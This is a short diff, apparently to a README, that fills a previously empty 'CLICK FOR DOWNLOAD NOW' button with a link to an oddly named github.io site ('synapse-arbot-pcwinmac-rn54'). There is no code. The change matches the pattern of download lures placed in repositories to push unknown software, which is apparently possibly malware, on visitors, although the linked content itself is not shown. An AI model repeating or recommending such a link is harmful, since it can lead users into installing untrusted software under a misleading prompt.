@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://synapse-arbot-pcwinmac-rn54.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
